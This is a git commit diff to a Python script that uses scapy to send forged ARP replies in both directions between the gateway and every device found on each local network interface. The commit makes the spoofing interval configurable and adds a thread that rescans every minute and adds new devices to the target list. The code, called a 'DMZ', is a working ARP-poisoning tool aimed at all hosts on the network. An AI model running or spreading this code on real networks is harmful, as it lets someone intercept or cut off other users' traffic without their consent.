71fbcd2581d52b0010d78ec248c3554c169a3327
Mainasara Tsowa <neutrino2211@gmail.com>
2022-03-20 17:05:06 +0100

    Update to allow changing interval

--- index.py
+++ index.py
@@ -1,14 +1,19 @@
 import scapy.all as scapy
 import time
 import threading
+import sys
 
 from get_devices import devices_on_ifaces
+
+_stop_device_scan = False
+dmzs = []
 
 class NetworkDMZ():
 
     def __init__(self, gateway_ip) -> None:
         self._gateway_ip = gateway_ip
         self._terminate_dmz = None
+        self._target_ips = None
         self.dmz_thread = None
         self.mac_cache = {}
 
@@ -48,35 +53,55 @@ class NetworkDMZ():
         packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
         scapy.send(packet, verbose = False)
    
-    def _start(self, target_ips, sleep):
+    def _start(self, sleep):
         while True:
             if self._terminate_dmz:
                 break
 
-            for target_ip in target_ips:
+            for target_ip in self._target_ips:
                 self.spoof(target_ip, self._gateway_ip)
                 self.spoof(self._gateway_ip, target_ip)
                 time.sleep(sleep)
 
-        for target_ip in target_ips:
+        for target_ip in self._target_ips:
             self.restore(self._gateway_ip, target_ip)
             self.restore(target_ip, self._gateway_ip)
+        
 
     def start(self, target_ips, sleep = 2):
-        self.dmz_thread = threading.Thread(target=self._start, args=(target_ips,sleep, ))
+        self._target_ips = target_ips
+        print("Using arp interval of %ds" % sleep)
+        self.dmz_thread = threading.Thread(target=self._start, args=(sleep, ))
         self.dmz_thread.start()
 
     def stop(self):
         self._terminate_dmz = True
 
+def _device_scan(sleep = 60):
+    while True:
+        if _stop_device_scan:
+            break
 
-dmzs = []
+        time.sleep(sleep)
+
+        print("Updating devices list")
+
+        for _, devices in devices_on_ifaces():
+            for dmz in dmzs:
+
+                if dmz._gateway_ip == devices[0][0]:
+                    dmz.cache_macaddresses(devices[1:])
+                    ips = [x for x, _ in devices[1:]]
+                    dmz._target_ips = ips
+
+    print("Stopped device scanning")
+    
 
 for _, devices in devices_on_ifaces():
     dmz = NetworkDMZ(devices[0][0])
     dmz.cache_macaddresses(devices[1:])
     ips = [x for x, _ in devices[1:]]
-    dmz.start(ips)
+    dmz.start(ips, sleep=float(sys.argv[1]) if len(sys.argv) > 1 else 2)
     print("Started DMZ on network with gateway", dmz._gateway_ip)
     dmzs.append(dmz)
   
@@ -87,8 +112,15 @@ for _, devices in devices_on_ifaces():
 #     net_dmz.stop()
 #     print("[+] Arp Spoof Stopped")
 
+print("Starting devices scan thread")
+
+device_scan_thread = threading.Thread(target=_device_scan)
+device_scan_thread.start()
+
 input("Press Enter to stop")
 
 for dmz in dmzs:
     dmz.stop()
     print("Stopped DMZ on network with gateway", dmz._gateway_ip)
+
+_stop_device_scan = True
